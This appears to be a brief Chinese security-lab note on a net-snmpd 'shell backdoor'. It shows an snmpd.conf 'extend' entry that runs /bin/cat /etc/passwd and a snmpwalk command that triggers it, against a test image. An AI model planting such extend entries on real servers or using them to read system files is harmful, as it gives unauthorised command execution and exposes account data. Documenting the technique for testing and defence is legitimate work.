### 运维安全 - net-snmpd shell 后门

测试镜像

* src/net-snmp/5.7.2

参考文章

* [SNMP Config File Injection to Shell](https://digi.ninja/blog/snmp_to_shell.php)

配置

```
# snmpd.conf
rocommunity testing
extend test /bin/cat /etc/passwd
```

触发

```
snmpwalk -v 2c -c testing 127.0.0.1 nsExtendOutput1
```

